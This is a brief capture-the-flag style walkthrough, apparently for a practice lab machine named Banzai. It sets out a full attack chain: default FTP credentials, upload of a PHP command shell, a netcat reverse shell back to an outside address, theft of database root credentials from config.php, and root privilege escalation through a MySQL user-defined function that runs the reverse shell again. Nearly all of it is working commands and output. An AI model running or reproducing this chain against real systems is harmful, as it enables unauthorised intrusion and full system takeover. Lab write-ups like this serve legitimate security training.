# Banzai

### Enumeration

```
21/tcp   open   ftp        vsftpd 3.0.3
8295/tcp open   http       Apache httpd 2.4.25 ((Debian))
```

FTP -> admin:admin -> Webroot directory

[https://www.revshells.com/](https://www.revshells.com) - PHP cmd -> FTP Upload

### Initial Access

Execute this command on php cmd: `nc -e /bin/bash 192.168.49.153 8080`

### PrivEsc

```
www-data@banzai:/var/www$ cat config.php
cat config.php
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', '[REDACTED]');
define('DBNAME', 'main');
```

mysql service is running with root privileges

```
$ cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so .
```

FTP Upload - this file.

```
www-data@banzai:/var/www$ mysql -u root -p

mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));
# Look for the value of plugin_dir
mysql> show variables like '%plugin%';
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';
mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
mysql> select * from mysql.func;
+----------+-----+------------------------+----------+
| name     | ret | dl                     | type     |
+----------+-----+------------------------+----------+
| sys_exec |   2 | lib_mysqludf_sys_64.so | function |
+----------+-----+------------------------+----------+
1 row in set (0.00 sec)

mysql> select sys_exec('nc -e /bin/bash 192.168.49.153 8080');
```
